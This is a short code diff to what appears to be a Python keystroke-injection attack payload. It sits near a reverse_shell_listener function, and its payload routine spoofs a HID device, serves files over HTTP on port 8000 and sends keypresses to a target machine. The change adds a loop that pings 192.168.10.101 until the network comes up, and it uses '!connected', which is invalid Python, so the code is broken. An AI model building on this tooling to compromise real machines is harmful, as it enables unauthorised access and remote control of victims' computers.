@@ -63,13 +63,21 @@ def reverse_shell_listener():
 
 def payload():
 	eco.change_hid()
+	connected=False
+	print("Waiting for network to come up")
+	while(!connected):
+		response = os.system("ping -c 1 192.168.10.101")
+		if(response == 0):
+			connected=True
+	print("Network up")
+
 	web_dir = os.path.join(os.path.dirname(__file__), 'http')
 	os.chdir(web_dir)
 	httpHandler = http.server.SimpleHTTPRequestHandler
 	httpd = socketserver.TCPServer(('',8000),httpHandler)
 	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
-	sleep(10)
+
 	eco.press("ENTER")
 	sleep(2)
 	eco.press("ESC")
